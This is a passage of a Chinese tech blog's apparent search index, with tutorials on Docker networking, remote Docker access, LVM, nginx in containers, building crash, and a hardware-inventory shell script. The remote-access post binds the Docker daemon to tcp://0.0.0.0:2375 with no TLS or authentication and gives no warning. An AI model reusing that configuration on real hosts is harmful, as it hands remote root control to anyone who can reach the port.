API，与docker守护进程进行通信，将自己的程序与docker进行集成\nRESTful风格的API：与大多数程序的API风格类似 STDIN、STDOUT、STDERR：Remote API在某些复杂的情况下，也支持这三种方式来与docker守护进程进行通信 如图就是使用自定义程序调用Remote API与docker守护进程通信的C/S模式 Client与守护进程的连接方式 unix:///var/run/docker.sock是默认的连接方式，可以通过配置修改为其他的socket连接方式\nunix:///var/run/docker.sock tcp://host:port fd://socketfd 用户可以通过dokcer的二进制命令接口或者自定义程序，自定义程序通过Remote API来调用docker守护进程，Client与Server之间通过Socket来进行连接，这种连接意味着Client与Server既可以在同一台机器上运行，也可以在不同机器上运行，Client可以通过远程的方式来连接Server ","permalink":"https://www.lvbibir.cn/posts/tech/docker_jian_jie/","summary":"docker简介 Docker 是一个开源项目，诞生于 2013 年初，最初是 dotCloud 公司内部的一个业余项目。它基于 Google 公司推出的 Go 语言实现。 项目后来加入了 Linux 基金会，遵从了","title":"docker简介以及基础概念"},{"content":"概述 独立容器网络：none host none网络最为安全，只有localback接口 host网络只和物理机相连，保证跟物理机相连的网络效率\t跟物理机完全一样（网络协议栈与主机名）\n容器间的网络：bridge docker bridge详解 docker启动时默认会有一个docker0网桥，该网桥就是桥接模式的体现 用户也可以自建bridge网络，建立后dokcer也会创建一个网桥\n跨主机的容器间的网络：macvlan overlay\n第三方网络：flannel weave calic\ndocker0 安装了docker的系统，使用ifconfig可以查看到docker0设备，docker守护进程就是通过docker0为容器提供网络连接的各种服务 docker0实际上是linux虚拟网桥（交换机) 网桥是数据链路层的设备，它通过mac地址来对网络进行划分，并且在不同的网络之间传递数据\nlinux虚拟网桥的特点：\n可以设置ip地址（二层的网桥可以设置三层的ip地址） 相当于拥有一个隐藏的虚拟网卡 docker0的地址划分：\nIP：172.17.0.1（各版本可能不同） 子网掩码：255.255.0.0 MAC：02:42:00:00:00:00 到 02:42:ff:ff:ff:ff（各版本可能不同） 总共提供了65534个地址 每当一个容器启动时，docker守护进程会创建网络连接的两端，一端在容器内创建eth0网卡，另一端在dokcer0网桥中开启一个端口veth*\n查看网桥设备需要预先安装bridge-utils软件包\n[root@localhost ~]# yum install -y bridge-utils [root@localhost ~]# brctl show bridge name bridge id STP enabled interfaces docker0 8000.024247d799bf no virbr0 8000.525400b76fd4 yes virbr0-nic 开启一个容器，查看网络设置：\n[root@localhost ~]# docker run -it --name nwt1 centos /bin/bash [root@0ef32e882bcf /]# ifconfig bash: ifconfig: command not found [root@0ef32e882bcf /]# yum install -y net-tools [root@0ef32e882bcf /]# ifconfig ctrl+p，ctrl+q 让这个人继续后台运行 再查看一下网桥\n[root@localhost ~]# brctl show [root@localhost ~]# ifconfig 自定义docker0 当默认docker0的ip或者网段与主机环境发生冲突时，可以修改docker0的地址和网段来进行自定义\nifconfig docker0 IP netmask NETMASK [root@localhost ~]# ifconfig docker0 192.168.200.1 netmask 255.255.255.0 [root@localhost ~]# ifconfig [root@localhost ~]# systemctl restart docker [root@localhost ~]# docker run -it centos /bin/bash [root@a5c6ebf79340 /]# yum install -y net-tools [root@a5c6ebf79340 /]# ifconfig 自定义虚拟网桥 添加虚拟网桥：\nbrctl addbr br0 ifconfig br0 IP netmask NETMASK 更改docker守护进程的启动配置\n/lib/systemd/system/docker.service中添加-b=br0 [root@localhost ~]# brctl addbr br0 [root@localhost ~]# ifconfig br0 192.168.100.1 netmask 255.255.255.0 [root@localhost ~]# ifconfig [root@localhost ~]# vim /lib/systemd/system/docker.service ExecStart=/usr/bin/dockerd -b=br0 [root@localhost ~]# systemctl daemon-reload [root@localhost ~]# systemctl restart docker [root@localhost ~]# ps -ef | grep docker root 4156 1 1 14:06 ? 00:00:00 /usr/bin/dockerd -b=br0 root 4161 4156 0 14:06 ? 00:00:00 docker-containerd --config /var/run/docker/containerd/containerd.toml root 4263 1558 0 14:06 pts/0 00:00:00 grep --color=auto docker 开启一个容器\n[root@localhost ~]# docker run -it --name nwt3 centos /bin/bash [root@d70269c9557e /]# yum install -y net-tools [root@d70269c9557e /]# ifconfig 同一宿主机间容器的连接 允许单台主机内所有容器互联（默认情况） 拒绝容器间连接 允许特定容器间的连接 允许单台主机内所有容器互联（默认情况） \u0026ndash;icc=true 默认为true，即允许同一宿主机下所有容器之间网络连通\n[root@localhost ~]# docker run -itd --name test1 busybox /bin/sh 7ec641b21b66b6472f4e92cfaa7f9c0674c4322a5265a05e272ae180b0d4687c [root@localhost ~]# docker exec test1 ifconfig eth0 eth0 Link encap:Ethernet HWaddr 02:42:AC:11:00:02 inet addr:172.17.0.2 Bcast:172.17.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:8 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:648 (648.0 B) TX bytes:0 (0.0 B) [root@localhost ~]# docker run -itd --name test2 busybox /bin/sh fee0ff3e7f82cd1fa06eea11d850251931dff4dff2f0c7ee3e5a9904532beeb6 [root@localhost ~]# docker exec test2 ping 172.17.0.2 -c 4 PING 172.17.0.2 (172.17.0.2): 56 data bytes 64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.133 ms 64 bytes from 172.17.0.2: seq=1 ttl=64 time=0.136 ms 64 bytes from 172.17.0.2: seq=2 ttl=64 time=0.264 ms 64 bytes from 172.17.0.2: seq=3 ttl=64 time=0.163 ms --- 172.17.0.2 ping statistics --- 4 packets transmitted, 4 packets received, 0% packet loss round-trip min/avg/max = 0.133/0.174/0.264 ms 容器的ip是不可靠的连接 可以使用\u0026ndash;link选项来连接两个容器\ndocker run --link=[CONTAINER_NAME]:[ALIAS] [IMAGE] [COMMAND] \u0026ndash;link后面的test3指连接到test3容器，nt是为test3创建了一个别名 新建两个容器进行测试\n[root@localhost ~]# docker run -itd --name test3 busybox /bin/sh 1fd4e373dba17fdf1fa93121e08ea2f1f32d8f4116339c072a72a73574b0926f [root@localhost ~]# docker run -itd --name test4 --link=test3:nt busybox /bin/sh c04b9b759bd4cc9af54000a742df58c8369a7f1bfc8862a8325481f1d61db135 [root@localhost ~]# [root@localhost ~]# docker exec test4 ping nt -c 4 PING nt (172.17.0.4): 56 data bytes 64 bytes from 172.17.0.4: seq=0 ttl=64 time=0.256 ms 64 bytes from 172.17.0.4: seq=1 ttl=64 time=0.196 ms 64 bytes from 172.17.0.4: seq=2 ttl=64 time=0.164 ms 64 bytes from 172.17.0.4: seq=3 ttl=64 time=0.148 ms --- nt ping statistics --- 4 packets transmitted, 4 packets received, 0% packet loss round-trip min/avg/max = 0.148/0.191/0.256 ms \u0026ndash;link选项对容器做了如下改变：\n修改了env环境变量 修改了hosts文件 [root@localhost ~]# docker exec test4 env [root@localhost ~]# docker exec test4 cat /etc/hosts 删除之前使用的test1与test2容器，这两个容器占用的ip释放，重启test3后，使用最新的ip地址\n[root@localhost ~]# docker rm -f test1 test1 [root@localhost ~]# docker rm -f test2 test2 [root@localhost ~]# docker restart test3 test3 [root@localhost ~]# docker exec test3 ifconfig eth0 eth0 Link encap:Ethernet HWaddr 02:42:AC:11:00:02 inet addr:172.17.0.2 Bcast:172.17.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:8 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:648 (648.0 B) TX bytes:0 (0.0 B) 可以看到随着test3的ip地址发生改变，test4容器中的hosts文件也随之改变\n[root@localhost ~]# docker exec test4 cat /etc/hosts 拒绝容器间连接 修改守护进程的启动选项：\u0026ndash;icc=false\n[root@localhost ~]# vim /lib/systemd/system/docker.service ExecStart=/usr/bin/dockerd --icc=false [root@localhost ~]# systemctl daemon-reload [root@localhost ~]# systemctl restart docker 新建两个容器进行测试，可以看到无法ping通\n[root@localhost ~]# docker run -itd --name test10 busybox /bin/sh 700f026459206531b0fda811a43bc12af2f0815dc695f317a1f52939bfada2a1 [root@localhost ~]# docker run -itd --name test11 busybox /bin/sh 792cc31481739e1b2537597bc54c76737333bf95412dac2209e050f35d276dd4 [root@localhost ~]# docker exec test10 ifconfig eth0 eth0 Link encap:Ethernet HWaddr 02:42:AC:11:00:06 inet addr:172.17.0.6 Bcast:172.17.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:8 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:648 (648.0 B) TX bytes:0 (0.0 B) [root@localhost ~]# docker exec test11 ping 172.16.0.6 ^C 允许特定容器间的连接 修改守护进程选项：\n\u0026ndash;icc=false \u0026ndash;iptables=true\t#允许docker容器配置添加到linux的iptables设置中 \u0026ndash;link 只有设置了\u0026ndash;link的两个容器间才可以互通\n[root@localhost ~]# vim /lib/systemd/system/docker.service ExecStart=/usr/bin/dockerd --icc=false --iptables=true [root@localhost ~]# systemctl daemon-reload [root@localhost ~]# systemctl restart docker 新建两个容器进行验证\n[root@localhost ~]# docker run -itd --name test21 busybox /bin/sh 77f56db227acaa590f729c12a4852d3131f1729851ea8c613a670effbfa512ad [root@localhost ~]# docker run -itd --name test22 --link=test21:nt busybox /bin/sh f4e346387588198cafcfd1d6a2c330a20375b746d05c08bf06e100f9af294a9e [root@localhost ~]# docker exec test22 ping nt -c 4 PING nt (172.17.0.2): 56 data bytes 64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.201 ms 64 bytes from 172.17.0.2: seq=1 ttl=64 time=0.164 ms 64 bytes from 172.17.0.2: seq=2 ttl=64 time=0.195 ms 64 bytes from 172.17.0.2: seq=3 ttl=64 time=0.188 ms --- nt ping statistics --- 4 packets transmitted, 4 packets received, 0% packet loss round-trip min/avg/max = 0.164/0.187/0.201 ms [root@localhost ~]# docker exec test22 ifconfig eth0 eth0 Link encap:Ethernet HWaddr 02:42:AC:11:00:03 inet addr:172.17.0.3 Bcast:172.17.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:14 errors:0 dropped:0 overruns:0 frame:0 TX packets:6 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:1124 (1.0 KiB) TX bytes:476 (476.0 B) [root@localhost ~]# docker exec test21 ping 172.17.0.3 -c 4 PING 172.17.0.3 (172.17.0.3): 56 data bytes 64 bytes from 172.17.0.3: seq=0 ttl=64 time=0.181 ms 64 bytes from 172.17.0.3: seq=1 ttl=64 time=0.168 ms 64 bytes from 172.17.0.3: seq=2 ttl=64 time=0.109 ms 64 bytes from 172.17.0.3: seq=3 ttl=64 time=0.226 ms --- 172.17.0.3 ping statistics --- 4 packets transmitted, 4 packets received, 0% packet loss round-trip min/avg/max = 0.109/0.171/0.226 ms ","permalink":"https://www.lvbibir.cn/posts/tech/docker_network/","summary":"概述 独立容器网络：none host none网络最为安全，只有localback接口 host网络只和物理机相连，保证跟物理机相连的网络效率 跟物理机完","title":"docker网络"},{"content":"前言 实现docker客户端与另一台主机上的docker守护进程进行通信\n环境准备 主机版本为Centos7.4，docker版本为docker-ce-18.09.7-3.el7.x86_64 node1：192.168.0.111 node2：192.168.0.107\n两台安装docker的环境 保证两台主机上的docker的Client API与Server APi版本一致 修改daemon.json配置文件，添加label，用于区别两台docker主机 node1：\n[root@localhost ~]# vim /etc/docker/daemon.json { \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;http://f1361db2.m.daocloud.io\u0026#34;], \u0026#34;labels\u0026#34;: [\u0026#34;-label nodeName=node1\u0026#34;] #添加label } 查看效果\n[root@localhost ~]# systemctl restart docker [root@localhost ~]# docker info node2; 修改Client与守护进程通信的方式（修改为tcp的方式） 修改通信方式共有三种方式：\n修改daemon.json文件，添加host键值对 添加：\u0026ldquo;hosts\u0026rdquo;: [\u0026ldquo;tcp://0.0.0.0:2375\u0026rdquo;] 开放本机ip的2375端口，可以让其他docker主机的client进行连接 修改/lib/systemd/system/docker.service文件，添加-H启动参数 修改：ExecStart=/usr/bin/docker -H tcp://0.0.0.0:2375 使用dokcerd启动docker，添加-H参数 dockerd -H tcp://0.0.0.0:2375 Centos7中/etc/docker/daemon.json会被docker.service的配置文件覆盖，直接添加daemon.json不起作用 所以我使用的是第二种方式\nnode1：\n[root@localhost ~]# vim /lib/systemd/system/docker.service ExecStart=/usr/bin/docker -H tcp://0.0.0.0:2375 [root@localhost ~]# systemctl daemon-reload [root@localhost ~]# systemctl restart docker [root@localhost ~]# ps -ef | grep docker root 5775 1 3 23:17 ? 00:00:00 /usr/bin/dockerd -H tcp://0.0.0.0:2375 root 5779 5775 0 23:17 ? 00:00:00 docker-containerd --config /var/run/docker/containerd/containerd.toml root 5879 3919 0 23:17 pts/1 00:00:00 grep --color=auto docker 远程访问 node2：\n[root@localhost ~]# curl http://192.168.0.111:2375/info [root@localhost ~]# docker -H tcp://192.168.0.111:2375 info 如果频繁使用-H选项未免太过于麻烦，可以修改DOCKER_HOST这个环境变量的值，node2就可以像使用本地的docker一样来远程连接node1的守护进程\n[root@localhost ~]# export DOCKER_HOST=\u0026#34;tcp://192.168.0.111:2375\u0026#34; [root@localhost ~]# docker info 当无需再远程连接node1的守护进程时，将DOCKER_HOST环境变量置空即可\n[root@localhost ~]# export DOCKER_HOST=\u0026#34;\u0026#34; [root@localhost ~]# docker info node1： 因为node1设置了修改Client与守护进程的通信方式，所以本地无法再通过默认的socket进行连接，必须使用-H选项通过tcp来进行连接，也可以通过DOCKER_HOST来修改\n[root@localhost ~]# docker info Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? [root@localhost ~]# docker -H 0.0.0.0:2375 info 如果本机依旧希望使用默认的socket进行连接，可以在/lib/systemd/system/docker.service中再添加一个-H选项\n[root@localhost ~]# vim /lib/systemd/system/docker.service ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock [root@localhost ~]# systemctl daemon-reload [root@localhost ~]# systemctl restart docker [root@localhost ~]# ps -ef | grep docker root 6462 1 2 23:40 ? 00:00:00 /usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock root 6467 6462 0 23:40 ? 00:00:00 docker-containerd --config /var/run/docker/containerd/containerd.toml root 6567 3919 0 23:40 pts/1 00:00:00 grep --color=auto docker [root@localhost ~]# docker info ","permalink":"https://www.lvbibir.cn/posts/tech/docker_yuan_cheng_fang_wen/","summary":"前言 实现docker客户端与另一台主机上的docker守护进程进行通信 环境准备 主机版本为Centos7.4，docker版本为docker-","title":"docker远程访问"},{"content":" LVM基本特性：（可以通过插件CLVM，实现群集逻辑卷管理） PV物理卷\nLV逻辑卷（逻辑卷管理：会在物理存储上生成抽象层，以便创建逻辑存储卷，方便设备命名）（下面是逻辑卷的分类） Linear\t线性卷(这是默认的lvm形式，即按顺序占用磁盘，一块写完了再写另一块) Stripe\t条带逻辑卷 RAID\traid逻辑卷 Mirror\t镜像卷 Thinly-Provision\t精简配置逻辑卷 Snapshot\t快照卷 Thinly-Provisioned Snapshot\t精简配置快照卷 Cache\t缓存卷\n创建PV时（一同被创建的有） 1：接近设备起始处，放置一个标签，包括uuid，元数据的位置　#(这个标签每个磁盘默认都保持一份) 2：lvm元数据，包含lvm卷组的配置详情 3：剩余空间，用于存储数据\nlvm逻辑卷概念 及　创建lvm的步骤 LVM的组成 PE：（物理拓展，是VG卷组的基本组成单位） PV：（物理卷） VG：（卷组） LV：（逻辑卷） 创建lvm的步骤 1：将磁盘创建为PV（物理卷），其实物理磁盘被条带化为PV，划成了一个一个的PE，默认每个PE大小是4MB 2：创建VG（卷组），其实它是一个空间池，不同PV加入同一VG 3：创建LV（逻辑卷），组成LV的PE可能来自不同的物理磁盘 4：格式化LV，挂载使用 lvm相关命令工具 pv操作命令 pvchange\t更改物理卷的属性 pvck\t检查物理卷元数据 pvcreate\t初始化磁盘或分区以供lvm使用 pvdisplay\t显示物理卷的属性 pvmove\t移动物理Exent pvremove\t删除物理卷 pvresize\t调整lvm2使用的磁盘或分区的大小 pvs\t报告有关物理卷的信息 pvscan\t扫描物理卷的所有磁盘 vg操作命令 vgcfgbackup\t备份卷组描述符区域 vgcfgrestore\t恢复卷组描述符区域 vgchange\t更改卷组的属性 vgck\t检查卷组元数据 vgconvert\t转换卷组元数据格式 vgcreate\t创建卷组 vgdisplay\t显示卷组的属性 vgexport\t使卷组对系统不了解（这是个什么） vgextend\t将物理卷添加到卷组 vgimportclone\t导入并重命名重复的卷组（例如硬件快照） vgmerge\t合并两个卷组 vgmknodes\t重新创建卷组目录和逻辑卷特殊文件 vgreduce\t通过删除一个或多个物理卷来减少卷组（将物理卷踢出VG） vgremove\t删除卷组 vgrename\t重命名卷组 vgs\t报告有关卷组信息 vgscan\t扫描卷组的所有磁盘并重建高速缓存 vgsplit\t将卷组拆分为两个，通过移动整个物理卷将任何逻辑卷从一个卷组移动到另一个卷组 lv操作命令 lvchange\t更改逻辑卷属性 lvconvert\t将逻辑卷从线性转换为镜像或快照 lvcreate\t将现有卷组中创建逻辑卷 lvdisplay\t显示逻辑卷的属性 lvextend\t扩展逻辑卷的大小 lvmconfig\t在加载lvm.conf和任何其他配置文件后显示配置信息 lvmdiskscan\t扫描lvm2可见的所有设备 lvmdump\t创建lvm2信息转储以用于诊断目的 lvreduce\t减少逻辑卷的大小 lvremove\t删除逻辑卷 lvrename\t重命名逻辑卷 lvresize\t调整逻辑卷大小 lvs\t报告有关逻辑卷的信息 lvscan\t扫描所有的逻辑卷 PV管理 制作PV pvcreate /dev/sdb1\n删除pv撤销PV（需先踢出vg） pvremove /dev/sdb1\nVG管理 制作VG vgcreate datavg /dev/sdb1 vgcreate datavg /dev/sdb1 /dev/sdb2 #解释：vgcreate vg名 分区\nvgcreate -s 16M datavg2 /dev/sdb3 #解释：-s 指定pe的大小为16M，默认不指定是4M\n从卷组中移除缺失的磁盘 vgreduce \u0026ndash;removemissing datavg vgreduce \u0026ndash;removemissing datavg \u0026ndash;force\t#强制移除\n扩展VG空间 vgextend datavg /dev/sdb3 pvs\n踢出vg中的某个成员 vgreduce datavg /dev/sdb3 vgs\nLV管理 制作LV lvcreate -n lvdata1 -L 1.5G datavg #解释：-n lv的name，-L 指定lv的大小，datavg 是vg的名字，表示从那个vg\n激活修复后的逻辑卷 lvchange -ay /dev/datavg/lvdata1 lvchange -ay /dev/datavg/lvdata1 -K\t#强制激活\nLVM的快照 用途：注意用途是数据一致性备份，先做一个快照，冻结当前系统，这样快照里面的内容可暂时保持不变，系统本身继续运行，通过重新挂载备份快照卷，实现不中断服务备份。\nlvcreate -s -n kuaizhao01 -L 100M /dev/datavg/lvdata1\n查看，删除使用方法 1：查看物理卷信息 pvs,pvdisplay\n2：查看卷组信息 vgs,vgdisplay\n3：查看逻辑卷信息 lvs,lvdisplay\n4：删除LV lvremove /dev/mapper/VG-mylv\n5：删除VG vgremove VG\n6：删除PV（注意删除顺序是LV，VG，PV） pvremove /dev/sdb\nvg卷组改名 vgrename xxxx-vgid-xxxx-xxxx xinname 细述LVM基本特性及日常管理细述LVM基本特性及日常管理\n拉伸一个逻辑卷LV 1:用vgdisplay查看vg还有多少空余空间 2:扩充逻辑卷 lvextend -L +1G /dev/VG/LV01 lvextend -L +1G /dev/VG/LV01 -r #这个命令表示在扩展的同时也更新文件系统，但是不是所有的发行版本都支持，部分文件系统不支持在线扩展的除外 3:进行扩充操作后，df -h你会发现大小并没有变 4:更新文件系统（争对不同的文件系统，其更新的命令也不一样） e2fsck -f /dev/datavg/lvdata1\t#ext4文件系统，检查lv的文件系统 resize2fs /dev/VG/LV01\t#ext4文件系统命令，该命令后面接lv的设备名就行\nxfs_growfs /nas\t#xfs文件系统，该命令后面直接跟的是挂载点 当更新文件系统后，你就会发现，df -h正常了\n缩小逻辑卷LV（必须离线，umount） 1：卸载\n2：缩小文件系统 resize2fs /dev/VG/LV01 2G\n3：缩小LV lvreduce -L -1G /dev/VG/LV01\n4：查看lvs，挂载使用\n拉伸一个卷组VG 1:新插入一块硬盘，若不是热插拔的磁盘，可以试试这个在系统上强制刷新硬盘接口 for i in /sys/class/scsi_host/*; do echo \u0026ldquo;- - -\u0026rdquo; \u0026gt; $i/scan; done\n2:将/dev/sdd条带化，格式化为PE pvcreate /dev/sdd\n3:将一块新的PV加入到现有的VG中 vgextend VG /dev/sdd\n4:查看大小 vgs\n缩小卷组VG（注意不要有PE在占用） 1：将一个PV从指定卷中移除 vgreduce VG /dev/sdd\n2：查看缩小后的卷组大小\n将磁盘加入和踢出VG 将sdd1踢出datavg组里 vgreduce datavg /dev/sdd1\n将sdb1加入datavg组里 vgextend datavg /dev/sdb1\nlvm灾难恢复场景案例 场景再现： 三块盘做lvm,现在有一块物理坏了，将剩下两块放到其他linux服务器上\n恢复步骤 第一，查看磁盘信息，lvm信息，确认能查到lvm相关信息，找到VG组的名字（pvs,lvs,vgs,fidsk,blkid） 第二：删除lvm信息中损坏的磁盘角色，（强制提出故障磁盘）\u0026ldquo;vgreduce \u0026ndash;removemissing VG_name \u0026quot; 第三：强制激活VG组 \u0026ldquo;vgchange -ay\u0026rdquo; 第四：强制激活LVM \u0026ldquo;lvchange -ay /dev/VG_name\u0026rdquo; 第五：挂载\n","permalink":"https://www.lvbibir.cn/posts/tech/lvm_characteristic_management/","summary":"LVM基本特性：（可以通过插件CLVM，实现群集逻辑卷管理） PV物理卷 LV逻辑卷（逻辑卷管理：会在物理存储上生成抽象层，以便创建逻辑存储卷，","title":"lvm基本特性及日常管理"},{"content":"创建映射80端口的交互式容器 [root@localhost ~]# docker run -it -p 80 --name web centos /bin/bash 安装nginx 安装wget、vim、make以及一些所需要的库文件和语言环境\n[root@ca453e479d0c /]# yum -y install wget gcc vim make [root@ca453e479d0c ~]# yum -y install gcc gcc-c++ automake pcre pcre-devel zlib zlib-devel open openssl-devel 下载nginx，解压安装\n[root@ca453e479d0c ~]# cd /usr/local/ [root@ca453e479d0c local]# wget http://nginx.org/download/nginx-1.7.4.tar.gz [root@ca453e479d0c local]# tar zxf nginx-1.7.4.tar.gz [root@ca453e479d0c local]# cd nginx-1.7.4 [root@ca453e479d0c nginx-1.7.4]# ./configure prefix=/usr/local/nginx \u0026amp;\u0026amp; make \u0026amp;\u0026amp; make install 创建静态页面 [root@ca453e479d0c ~]# mkdir -p /var/www/html [root@ca453e479d0c ~]# cd /var/www/html/ [root@ca453e479d0c html]# vim index.html \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Nginx in docker\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Hello, I\u0026#39;m website in Docker!\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 修改nginx配置文件 [root@ca453e479d0c ~]# vim /usr/local/nginx/conf/nginx.conf location / { root /var/www/html; index index.html index.htm; } 运行nginx [root@ca453e479d0c sbin]# ln -s /usr/local/nginx/sbin/nginx /usr/local/sbin/ [root@ca453e479d0c sbin]# nginx [root@ca453e479d0c ~]# ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 07:16 pts/0 00:00:00 /bin/bash root 5417 1 0 07:54 ? 00:00:00 nginx: master process ./nginx nobody 5418 5417 0 07:54 ? 00:00:00 nginx: worker process root 5422 1 0 07:55 pts/0 00:00:00 ps -ef 验证网站访问 查看映射端口\n[root@localhost ~]# docker ps [root@localhost ~]# docker port web 80/tcp -\u0026gt; 0.0.0.0:32769 验证nginx是否可以对外提供服务\n[root@localhost ~]# curl http://127.0.0.1:32769 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Nginx in docker\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Hello, I\u0026#39;m website in Docker!\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 浏览器访问（宿主机ip地址）\n查看容器的ip地址\n[root@localhost ~]# docker inspect web | grep IPAddress \u0026#34;SecondaryIPAddresses\u0026#34;: null, \u0026#34;IPAddress\u0026#34;: \u0026#34;172.17.0.3\u0026#34;, \u0026#34;IPAddress\u0026#34;: \u0026#34;172.17.0.3\u0026#34;, [root@localhost ~]# curl http://172.17.0.3 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Nginx in docker\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Hello, I\u0026#39;m website in Docker!\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 浏览器访问（容器ip地址）\n","permalink":"https://www.lvbibir.cn/posts/tech/docker_run_nginx/","summary":"创建映射80端口的交互式容器 [root@localhost ~]# docker run -it -p 80 --name web centos /bin/bash 安装nginx 安装wget、vim、make以及一些所需要的库文件和语言环境 [root@ca453e479d0c /]# yum -y install wget gcc","title":"使用 docker 部署静态网站（nginx）"},{"content":"环境：操作系统：isoft-serveros-v5.1鲲鹏版，crash-7.2.8 软件包下载地址 https://ftp.gnu.org/gnu/termcap/termcap-1.3.tar.gz https://github.com/crash-utility/crash/archive/refs/tags/7.2.8.tar.gz https://ftp.gnu.org/gnu/gdb/gdb-7.6.tar.gz\n1、安装 termcap 按照 https://blog.csdn.net/u010241497/article/details/82998887 中的方法修改tparam.c文件中的代码\n./configure \u0026amp;\u0026amp; make \u0026amp;\u0026amp; make install 2、安装ncurses 挂载本地dnf源略\ndnf install ncurses-libs dnf install ncurses-devel 3、安装gbd tar zxf gdb-7.6.tar.gz cd gdb-7.6 ./configure vim Makefile 添加上述选项，跳过编译中的警告\nmake \u0026amp;\u0026amp; make install 4、安装crash tar zxf crash-7.2.8.tar.gz cd crash-7.2.8/ make target=arm64 ","permalink":"https://www.lvbibir.cn/posts/tech/crash_install_aarch64/","summary":"环境：操作系统：isoft-serveros-v5.1鲲鹏版，crash-7.2.8 软件包下载地址 https://ftp.gnu.org/gnu/termcap/termcap-1.3.tar.gz https://github.com/crash-utility/crash/archive/refs/tags/7.2.8.tar.gz https://ftp.gnu.org/gnu/gdb/gdb-7.6.tar.gz 1、安装 termcap 按照 https://blog.csdn.net/u010241497/article/details/82998887 中的方法修改tpar","title":"编译安装crash（kernel=4.19，cpu=aarch64）"},{"content":"前言 查看硬件信息，并将信息整合成json数值，然后传给前段进行分析，最后再进行相应的处理。在装系统的时候，或是进行监控时，都是一个标准的自动化运维流程。使用shell直接生成好json数据再进行传输，会变得非常方便。\n环境 [root@sys-idc-pxe01 ~]# yum install jq lsscsi MegaCli 脚本内容 #!/bin/sh #description: get server hardware info #author: lvbibir #date: 20180122 #需要安装jq工具 yum install jq #用于存放该服务器的所有信息，个人喜欢把全局变量写到外面 #写到函数里面，没有加local的变量也是全局变量 INFO=\u0026#34;{}\u0026#34; #定义一个工具函数，用于生成json数值，后面将会频繁用到 function create_json() { #utility function local key=$1 local value=\u0026#34;$2\u0026#34; local json=\u0026#34;\u0026#34; #if value is string if [ -z \u0026#34;$(echo \u0026#34;$value\u0026#34; |egrep \u0026#34;\\[|\\]|\\{|\\}\u0026#34;)\u0026#34; ] then json=$(jq -n {\u0026#34;$key\u0026#34;:\u0026#34;\\\u0026#34;$value\\\u0026#34;\u0026#34;}) #if value is json, object elif [ \u0026#34;$(echo \u0026#34;$value\u0026#34; |jq -r type)\u0026#34; == \u0026#34;object\u0026#34; ] then json=$(jq -n {\u0026#34;$key\u0026#34;:\u0026#34;$value\u0026#34;}) #if value is array elif [ \u0026#34;$(echo \u0026#34;$value\u0026#34; |jq -r type)\u0026#34; == \u0026#34;array\u0026#34; ] then json=$(jq -n \u0026#34;{$key:$value}\u0026#34;) else echo \u0026#34;value type error...\u0026#34; exit 1 return 0 fi echo $json return 0 } #获取CPU信息 function get_cpu() { #获取cpu信息，去掉空格和制表符和空行，以便于for循环 local cpu_model_1=$(dmidecode -s processor-version |grep \u0026#39;@\u0026#39; |tr -d \u0026#34; \u0026#34; |tr -s \u0026#34;\\n\u0026#34; |tr -d \u0026#34;\\t\u0026#34;) local cpu_info=\u0026#34;{}\u0026#34; local i=0 #因为去掉了空格和制表符，以下默认使用换行符分隔 for line in $(echo \u0026#34;$cpu_model_1\u0026#34;) do local cpu_model=\u0026#34;$line\u0026#34; local cpu1=$(create_json \u0026#34;cpu_model\u0026#34; \u0026#34;$cpu_model\u0026#34;) #获取每块cpu的信息，这里只记录了型号 local cpu=$(create_json \u0026#34;cpu_$i\u0026#34; \u0026#34;$cpu1\u0026#34;) local cpu_info=$(jq -n \u0026#34;$cpu_info + $cpu\u0026#34;) i=$[ $i + 1] done #将cpu的信息整合成一个json，key是cpu local info=$(create_json \u0026#34;cpu\u0026#34; \u0026#34;$cpu_info\u0026#34;) #将信息加入到全局变量中 INFO=$(jq -n \u0026#34;$INFO + $info\u0026#34;) return 0 } function get_mem() { #generate json {Locator:{sn:sn,size:size}} local mem_info=\u0026#34;{}\u0026#34; #获取每个内存的信息，包括Size:|Locator:|Serial Number: local mem_info_1=$(dmidecode -t memory |egrep \u0026#39;Size:|Locator:|Serial Number:\u0026#39; |grep -v \u0026#39;Bank Locator:\u0026#39; |awk \u0026#39; { if (NR%3==1 \u0026amp;\u0026amp; $NF==\u0026#34;MB\u0026#34;) { size=$2; getline (NR+1); locator=$2; getline (NR+2); sn=$NF; printf(\u0026#34;%s,%s,%s\\n\u0026#34;,locator,size,sn) } }\u0026#39;) #根据上面的信息，将信息过滤并整合成json local i=0 for line in 